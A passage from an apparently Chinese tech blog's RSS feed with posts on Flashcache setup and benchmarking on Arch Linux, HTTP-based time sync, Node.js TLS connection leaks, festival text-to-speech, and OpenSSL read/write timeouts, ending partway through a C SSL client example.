<dt>《<a href="http://zengrong.net/post/2014.htm">在CentOS 6.1上配置 4TB硬盘+RAID1</a>》</dt><dd>使用 <code>parted</code> 代替 <code>fdisk</code> 对大于2TB的硬盘进行分区</dd>

<dt>《<a href="http://wiki.mikejung.biz/Software_RAID">Software RAID - How to Optimize Software RAID on Linux using Mdadm</a>》</dt><dd>优化RAID</dd>

<dt>《<a href="http://sysadmin.blog.51cto.com/83876/236802">RAID5单盘故障读写分析</a>》</dt><dd>RAID5一块盘坏掉后的情形分析</dd>
</dl>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[在Archlinux上使用FlashCache]]></title>
            <link>/article/5728-archlinux-4e0a4f7f7528-flashcache.html</link>
            <guid>/article/5728-archlinux-4e0a4f7f7528-flashcache.html</guid>
            <pubDate>Thu, 23 Apr 2015 12:16:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
<a href="https://github.com/facebook/flashcache/">Flashcache</a> 是 <a href="https://www.facebook.com">Facebook</a> 的一个开源项目，通过将固态硬盘（SSD）做为机械硬盘（HDD）的缓存层，提升磁盘I/O性能。
</p>

<p>
<a href="https://github.com/facebook/flashcache/">Flashcache</a> 位于磁盘驱动层与文件系统层之间，是一个 <code>linux</code> 内核模块。
</p>

<div id="outline-container-orgc30cf8c" class="outline-2">
<h2 id="orgc30cf8c">编译安装</h2>
<div class="outline-text-2" id="text-orgc30cf8c">
<p>
由于Archlinux总是使用最新的linux内核，最好从最新的 <a href="https://github.com/facebook/flashcache/">Flashcache</a> 源代码进行编译安装。
</p>

<div class="org-src-container">
<pre class="src src-sh">git clone https://github.com/facebook/flashcache.git
<span style="color: #b294bb;">cd</span> flashcache
make
sudo make install
</pre>
</div>
</div>
</div>

<div id="outline-container-org0c74dfe" class="outline-2">
<h2 id="org0c74dfe">挂载模块</h2>
<div class="outline-text-2" id="text-org0c74dfe">
<div class="org-src-container">
<pre class="src src-sh">sudo insmod /lib/modules/<span style="color: #b294bb;">`uname -r`</span>/extra/flashcache/flashcache.ko
</pre>
</div>

<ul class="org-ul">
<li><p>
修复挂载错误
</p>

<blockquote>
<p>
insmod: ERROR: could not insert module /lib/modules/3.19.3-3-ARCH/extra/flashcache/flashcache.ko: Unknown symbol in module
</p>
</blockquote>

<p>
通过 <code>dmesg | grep flashcache</code> 可以看到以下错误信息：
</p>

<blockquote>
<p>
[ 2130.514615] flashcache: Unknown symbol dm_put_device (err 0)<br />
[ 2130.514654] flashcache: Unknown symbol dm_io_client_create (err 0)<br />
[ 2130.514693] flashcache: Unknown symbol dm_kcopyd_client_create (err 0)<br />
[ 2130.514738] flashcache: Unknown symbol dm_unregister_target (err 0)<br />
[ 2130.514774] flashcache: Unknown symbol dm_io_client_destroy (err 0)<br />
[ 2130.514798] flashcache: Unknown symbol dm_kcopyd_copy (err 0)<br />
[ 2130.514821] flashcache: Unknown symbol dm_register_target (err 0)<br />
[ 2130.514846] flashcache: Unknown symbol dm_kcopyd_client_destroy (err 0)<br />
[ 2130.514870] flashcache: Unknown symbol dm_table_get_mode (err 0)<br />
[ 2130.514895] flashcache: Unknown symbol dm_io (err 0)<br />
[ 2130.514915] flashcache: Unknown symbol dm_get_device (err 0)
</p>
</blockquote>

<p>
先挂载 <code>dm-mod</code> 模块再挂载 <code>flashcache</code> 模块即可：
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo modprobe dm-mod
sudo insmod /lib/modules/<span style="color: #b294bb;">`uname -r`</span>/extra/flashcache/flashcache.ko
</pre>
</div>

<p>
参考：<a href="https://bbs.archlinux.org/viewtopic.php?id=30478">No entry for device-mapper found</a>
</p></li>
</ul>
</div>
</div>

<div id="outline-container-org34fa1db" class="outline-2">
<h2 id="org34fa1db">模拟实验</h2>
<div class="outline-text-2" id="text-org34fa1db">
<p>
参考：<a href="http://my.oschina.net/renguijiayi/blog/303747">flashcache的实现与用法</a>
</p>

<ul class="org-ul">
<li><p>
创建SSD模拟设备
</p>

<p>
使用内存文件模拟块设备（1G）
</p>

<div class="org-src-container">
<pre class="src src-sh">dd <span style="color: #f0c674;">if</span>=/dev/zero <span style="color: #f0c674;">of</span>=/dev/shm/ssd.img <span style="color: #f0c674;">bs</span>=1024k <span style="color: #f0c674;">count</span>=1024
sudo losetup /dev/loop1 /dev/shm/ssd.img
</pre>
</div></li>

<li><p>
创建HDD模拟设备
</p>

<p>
使用普通磁盘文件模拟块设备（5G）
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo dd <span style="color: #f0c674;">if</span>=/dev/zero <span style="color: #f0c674;">of</span>=/hdd.img <span style="color: #f0c674;">bs</span>=1024k <span style="color: #f0c674;">count</span>=5120
sudo losetup /dev/loop2 /hdd.img
</pre>
</div></li>

<li><p>
创建Flashcache混合设备
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo flashcache_create -p around cachedev /dev/loop1 /dev/loop2
sudo mkfs.ext4 /dev/mapper/cachedev
</pre>
</div></li>

<li><p>
挂载Flashcache混合设备
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo mkdir /data
sudo mount /dev/mapper/cachedev /data
</pre>
</div></li>
</ul>

<p>
/data目录下的数据读写就已经在使用Flashcache了。
</p>

<ul class="org-ul">
<li><p>
创建用来测试的数据文件（1G）
</p>

<div class="org-src-container">
<pre class="src src-sh">dd <span style="color: #f0c674;">if</span>=/dev/urandom <span style="color: #f0c674;">of</span>=/dev/shm/test.dat <span style="color: #f0c674;">bs</span>=1024k <span style="color: #f0c674;">count</span>=1024
</pre>
</div></li>

<li><p>
测算使用HDD写耗时
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo sh -c <span style="color: #8abeb7;">'echo 1 &gt; /proc/sys/vm/drop_caches; time cp /dev/shm/test.dat /'</span>
</pre>
</div>

<p>
输出：
</p>

<pre class="example">
real    0m4.751s
user    0m0.000s
sys 0m0.600s
</pre></li>

<li><p>
测算使用HDD读耗时
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo sh -c <span style="color: #8abeb7;">'echo 1 &gt; /proc/sys/vm/drop_caches; time cp /test.dat /dev/shm/</span>
</pre>
</div>

<p>
输出：
</p>

<pre class="example">
real    0m10.580s
user    0m0.010s
sys 0m0.727s
</pre></li>

<li><p>
测算使用Flashcache写耗时
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo sh -c <span style="color: #8abeb7;">'echo 1 &gt; /proc/sys/vm/drop_caches; time cp /dev/shm/test.dat /data/'</span>
</pre>
</div>

<p>
输出：
</p>

<pre class="example">
real    0m7.363s
user    0m0.000s
sys 0m0.760s
</pre></li>

<li><p>
测算使用Flashcache读耗时
</p>

<p>
第一轮测试（缓存预热）
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo sh -c <span style="color: #8abeb7;">'echo 1 &gt; /proc/sys/vm/drop_caches; time cp /data/test.dat /dev/shm/'</span>
</pre>
</div>

<p>
输出：
</p>

<pre class="example">
real    0m9.557s
user    0m0.013s
sys 0m1.157s
</pre>

<p>
第二轮测试（缓存生效）
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo sh -c <span style="color: #8abeb7;">'echo 1 &gt; /proc/sys/vm/drop_caches; time cp /data/test.dat /dev/shm/'</span>
</pre>
</div>

<p>
输出：
</p>

<pre class="example">
real    0m3.107s
user    0m0.000s
sys 0m0.850s
</pre></li>

<li><p>
清除测试数据
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo rm /test.dat /dev/shm/test.dat /data/test.dat
</pre>
</div></li>

<li><p>
结果分析
</p>

<ul class="org-ul">
<li>Flashcache读性能： <b>提升70%</b></li>

<li>Flashcache写性能： <b>降低55%</b></li>
</ul>

<p>
因为使用了 <code>Write-Around</code> 方式，所以提升了读性能，降低了写性能。
</p></li>

<li><p>
清除模拟环境
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo umount /data
sudo dmsetup remove cachedev
sudo losetup -d /dev/loop1
sudo rm /dev/shm/ssd.img
sudo losetup -d /dev/loop2
sudo rm /hdd.img
sudo rmdir /data
</pre>
</div></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[linux下通过HTTP同步系统时间]]></title>
            <link>/article/linux-4e0b901a8fc7-http-540c6b657cfb7edf65f695f4.html</link>
            <guid>/article/linux-4e0b901a8fc7-http-540c6b657cfb7edf65f695f4.html</guid>
            <pubDate>Tue, 21 Apr 2015 03:54:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在 <code>NTP</code> 被禁用的网络环境下，可以通过 <code>HTTP</code> 协议从公开的网站（如：www.baidu.com）同步时间，因为HTTP响应通常会带一个Date字段，这是WEB服务器的系统时间，可以用它来设置本机时间。
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo date --rfc-2822 -s <span style="color: #8abeb7;">"`curl -s -i -X HEAD --header "Connection: close" http:/</span><span style="color: #8abeb7; text-decoration: underline;">/www.baidu.com | grep -E '^Date: ' | awk -F ': ' '{print $2}'`"</span>
</pre>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Node.js服务器TCP死连接问题诊断]]></title>
            <link>/article/node.js-670d52a15668-tcp-6b7b8fde63a595ee98988bca65ad.html</link>
            <guid>/article/node.js-670d52a15668-tcp-6b7b8fde63a595ee98988bca65ad.html</guid>
            <pubDate>Thu, 16 Apr 2015 12:29:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
最近一段时间，由于开发工作开始跟嵌入式相关，开始遇到一个问题：TCP死连接。
</p>

<p>
TCP死连接症状是这样的：通信双方从一方系统上看已经断开（不存在），但是另一方系统上看却是连接中（ESTABLISHED状态）。
</p>

<p>
TCP死连接一般在一方（或中间线路上的设备）断电、死机后出现，此时由于另一方收不到断开连接的IP报文，会认为连接仍然存在，日积月累会耗光文件描述符空间从而导致性能下降，最终拒绝服务。
</p>

<p>
对付这种问题，一般需要双方都进行连接心跳检测。比如：连接空闲一段时间后一方发一个心跳请求，另一端回个心跳响应，心跳请求发送方一段时间后还收不到响应则认为连接已断开，心跳请求接收方一段时间内没有收到心跳请求也认为连接已断开。
</p>

<p>
需要注意到的是node.js的tls服务器端握手超时处理不当可能会导致TCP死连接出现，有问题的代码示例如下：
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">options</span> = {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   key: <span style="color: #8abeb7;">"..."</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   cert: <span style="color: #8abeb7;">"..."</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   handshakeTimeout: 10*1000,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   plain: <span style="color: #81a2be;">true</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   ssl: <span style="color: #81a2be;">true</span>
};

<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">tlsServer</span> = tls.createServer(options, app).listen(5433, 8192, <span style="color: #b5bd68;">function</span>(){
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   logger.log(<span style="color: #8abeb7;">'tls server listening on port 5433'</span>);
});

tlsServer.on(<span style="color: #8abeb7;">'clientError'</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">exception</span>, <span style="color: #f0c674;">socket</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   logger.warn(<span style="color: #8abeb7;">'tls server client('</span> + socket.remoteAddress + <span style="color: #8abeb7;">':'</span> + socket.remot<span style="text-decoration: underline;">ePort +</span><span style="color: #8abeb7; text-decoration: underline;">') error('</span><span style="text-decoration: underline;"> + exception + </span><span style="color: #8abeb7; text-decoration: underline;">')'</span><span style="text-decoration: underline;">);</span>
});
</pre>
</div>

<p>
上面的代码通过指定 <code>handshakeTimeout</code> 使用指定SSL握手超时时间，但是并未关闭底层的TCP连接，从而导致TCP连接泄露，在 <code>clientError</code> 事件处理函数中添加以下释放语句即可：
</p>

<div class="org-src-container">
<pre class="src src-js">socket.destroy();
</pre>
</div>

<p>
除了常见的断电、死机引起TCP死连接外，这里还有一个论坛帖子论坛其它原因：《<a href="http://serverfault.com/questions/504187/too-many-established-connections-left-open">Too many established connections left open</a>》。
</p>

<p>
另外还有 linux 内核的 tcp keepalive机制作为心跳解决方案：《<a href="http://machael.blog.51cto.com/829462/211989/">linux下使用TCP存活(keepalive)定时器</a>》。
</p>

<p>
谨记：除了主动通过连接发送数据外，其它情况下操作系统可能不会告诉你连接已经关闭了。
</p>

<p>
要彻底解决这个问题，除了要避免泄露（或忘记关闭）TCP连接外，要有心跳机制，还需要从代码层面进行防御性编程，如：对于读写操作设置超时时间，一旦超时主动关闭连接。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Archlinux安装文本语音合成（TTS）]]></title>
            <link>/article/archlinux-5b8988c56587672c8bed97f354086210ff08-tts-ff09.html</link>
            <guid>/article/archlinux-5b8988c56587672c8bed97f354086210ff08-tts-ff09.html</guid>
            <pubDate>Wed, 15 Apr 2015 12:21:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org5c499dd" class="outline-2">
<h2 id="org5c499dd">安装 <code>festival</code></h2>
<div class="outline-text-2" id="text-org5c499dd">
<div class="org-src-container">
<pre class="src src-sh">yaourt -S festival festival-english festival-us
</pre>
</div>
</div>
</div>

<div id="outline-container-orgd3129ff" class="outline-2">
<h2 id="orgd3129ff">测试运行</h2>
<div class="outline-text-2" id="text-orgd3129ff">
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"This is an example. Arch is the best."</span> | festival --tts
</pre>
</div>

<ul class="org-ul">
<li>修复错误 <code>Linux: can't open /dev/dsp</code></li>
</ul>

<p>
参考 <a href="https://wiki.archlinux.org/index.php/Festival#Can.27t_open_.2Fdev.2Fdsp">这里</a> 将以下内容添加到 <code>~/.festivalrc</code>
</p>

<div class="org-src-container">
<pre class="src src-lisp">(Parameter.set 'Audio_Method 'Audio_Command)
(Parameter.set 'Audio_Command <span style="color: #8abeb7;">"aplay -q -c 1 -t raw -f s16 -r $SR $FILE"</span>)
</pre>
</div>
</div>
</div>

<div id="outline-container-orgd8b9788" class="outline-2">
<h2 id="orgd8b9788">参考</h2>
<div class="outline-text-2" id="text-orgd8b9788">
<p>
<a href="https://wiki.archlinux.org/index.php/Festival">https://wiki.archlinux.org/index.php/Festival</a>
</p>

<p>
<a href="https://linuxtoy.org/archives/festival_on_ubuntu.html">https://linuxtoy.org/archives/festival_on_ubuntu.html</a></p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[SSL_read及SSL_write支持超时]]></title>
            <link>/article/ssl_read-53ca-ssl_write-652f63018d8565f6.html</link>
            <guid>/article/ssl_read-53ca-ssl_write-652f63018d8565f6.html</guid>
            <pubDate>Tue, 27 Jan 2015 06:29:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
原始的socket编程中 <code>read</code> 、 <code>write</code> 支持超时是很容易实现的，如使用 <code>select</code> 或者 <code>setsockopt</code> 设置读写超时并在 <code>read</code> 和 <code>write</code> 出错后根据 <code>errno</code> 判断是否为超时引起。
</p>

<p>
但是在 <code>SSL</code> 编程中对底层socket调用 <code>select</code> 以及使用 <code>errno</code> 行为是未定义的。
</p>

<p>
使用 <code>setsockopt</code> 在底层的socket上设置读写后， <code>SSL_read</code> 、 <code>SSL_write</code> 出错会返回ssl错误码 <code>SSL_ERROR_WANT_READ</code> 或 <code>SSL_ERROR_WANT_WRITE</code> ，
但是被信号中断或者底层SSL需要重新握手也会导致 <code>SSL_read</code> 、 <code>SSL_write</code> 返回同样的ssl错误码。
</p>

<p>
如果能够将信号屏蔽掉，并启用SSL自动重新握手，就能够实现 <code>SSL_read</code> 、 <code>SSL_write</code> 超时检测。
</p>

<ul class="org-ul">
<li><p>
屏蔽信号
</p>

<p>
忽略应用产生的信号，如：
</p>

<div class="org-src-container">
<pre class="src src-c"><span style="color: #de935f;">signal</span>(<span style="color: #81a2be;">SIGPIPE</span>, <span style="color: #81a2be;">SIG_IGN</span>);
<span style="color: #de935f;">signal</span>(<span style="color: #81a2be;">SIGCHLD</span>, <span style="color: #81a2be;">SIG_IGN</span>);
</pre>
</div></li>

<li><p>
在底层socket上设置超时
</p>

<div class="org-src-container">
<pre class="src src-c"><span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">timeval</span> <span style="color: #f0c674;">tv</span>;
tv.tv_sec  = 10;
tv.tv_usec = 0;
<span style="color: #de935f;">setsockopt</span>(<span style="color: #81a2be;">sock</span>, <span style="color: #81a2be;">SOL_SOCKET</span>, <span style="color: #81a2be;">SO_SNDTIMEO</span>, (<span style="color: #81a2be;">char</span>*)&amp;tv, <span style="color: #b5bd68;">sizeof</span>(<span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">timeval</span>));
<span style="color: #de935f;">setsockopt</span>(<span style="color: #81a2be;">sock</span>, <span style="color: #81a2be;">SOL_SOCKET</span>, <span style="color: #81a2be;">SO_RCVTIMEO</span>, (<span style="color: #81a2be;">char</span>*)&amp;tv, <span style="color: #b5bd68;">sizeof</span>(<span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">timeval</span>));
</pre>
</div></li>

<li><p>
启用自动重新握手
</p>

<div class="org-src-container">
<pre class="src src-c"><span style="color: #de935f;">SSL_CTX_set_mode</span>(<span style="color: #81a2be;">ctx</span>, <span style="color: #81a2be;">SSL_MODE_AUTO_RETRY</span>);
</pre>
</div></li>

<li><p>
<code>SSL_read</code> 和 <code>SSL_write</code> 判断是否超时出错
</p>

<div class="org-src-container">
<pre class="src src-c"><span style="color: #81a2be;">int</span> <span style="color: #f0c674;">readed</span> = SSL_read(ssl, data, size);
<span style="color: #b5bd68;">if</span> (readed &lt;= 0) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (SSL_get_error(ssl, readed) == SSL_ERROR_WANT_READ) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">timeout</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> } <span style="color: #b5bd68;">else</span> {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">error</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }
}

<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">writed</span> = SSL_write(ssl, data, size);
<span style="color: #b5bd68;">if</span> (writed &lt;= 0) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (SSL_get_error(ssl, writed) == SSL_ERROR_WANT_WRITE) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">timeout</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> } <span style="color: #b5bd68;">else</span> {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">error</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }
}
</pre>
</div></li>
</ul>

<div id="outline-container-org9179607" class="outline-2">
<h2 id="org9179607">ssl 客户端示例代码</h2>
<div class="outline-text-2" id="text-org9179607">
<p>
这个示例包括建立连接、读、写，以及超时设置、服务器证书验证。
</p>
<div class="org-src-container">
<pre class="src src-c"><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;arpa/inet.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;netinet/in.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;openssl/err.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;openssl/ssl.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;openssl/x509_vfy.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;openssl/x509v3.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;stdbool.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;stdint.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;string.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;strings.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;sys/socket.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;unistd.h&gt;</span>

<span style="color: #b294bb;">#define</span> <span style="color: #f0c674;">SSL_CLIENT_CAFILE</span> <span style="color: #8abeb7;">"/etc/ssl/certs/ca-certificates.crt"</span>
<span style="color: #b294bb;">#define</span> <span style="color: #f0c674;">SSL_CLIENT_CAPATH</span> <span style="color: #8abeb7;">"/etc/ssl/certs/"</span>

<span style="color: #81a2be;">int</span> <span style="color: #de935f;">ssl_client_connect</span>(<span style="color: #81a2be;">uint32_t</span> <span style="color: #f0c674;">ip</span>, <span style="color: #81a2be;">uint16_t</span> <span style="color: #f0c674;">port</span>, <span style="color: #81a2be;">SSL</span>** <span style="color: #f0c674;">ssl</span>, <span style="color: #81a2be;">SSL_CTX</span>** <span style="color: #f0c674;">ctx</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #81a2be;">uint32_t</span> <span style="color: #f0c674;">timeout</span>, <span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">char</span>* <span style="color: #f0c674;">verify_host</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">sock</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">sockaddr_in</span> <span style="color: #f0c674;">dest</span>;

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> ((sock = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"create remote socket fd failed!"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> -1;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> bzero(&amp;dest, <span style="color: #b5bd68;">sizeof</span>(dest));
<span style="color: #969896; background-color: #22a224a427a7;"> </span> dest.sin_family = AF_INET;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> dest.sin_port = htons(port);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> dest.sin_addr.s_addr = ip;

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">char</span> <span style="color: #f0c674;">ip_string</span>[INET_ADDRSTRLEN] = {<span style="color: #8abeb7;">'\0'</span>};
<span style="color: #969896; background-color: #22a224a427a7;"> </span> inet_ntop(AF_INET, &amp;dest.sin_addr, ip_string, <span style="color: #b5bd68;">sizeof</span>(ip_string));

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (connect(sock, (<span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">sockaddr</span>*)&amp;dest, <span style="color: #b5bd68;">sizeof</span>(dest)) != 0) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"connect to %s:%d failed: %s"</span>, ip_string, port,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> strerror(errno));
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> close(sock);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> -1;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"tcp connect to %s:%d success"</span>, ip_string, port);

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">&#35774;&#32622;send/recv&#30340;&#36229;&#26102;&#26102;&#38388; </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">timeval</span> <span style="color: #f0c674;">tv</span> = {<span style="color: #8abeb7;">'\0'</span>};
<span style="color: #969896; background-color: #22a224a427a7;"> </span> tv.tv_sec = timeout;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> tv.tv_usec = 0;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">succ</span> = setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (<span style="color: #81a2be;">char</span>*)&amp;tv,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">sizeof</span>(<span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">timeval</span>));
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (succ != 0) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"set send timeout failed: %s"</span>, strerror(errno));
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> close(sock);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> -1;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> }
<span style="color: #969896; background-color: #22a224a427a7;"> </span> succ = setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (<span style="color: #81a2be;">char</span>*)&amp;tv,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">sizeof</span>(<span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">timeval</span>));
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (succ != 0) {
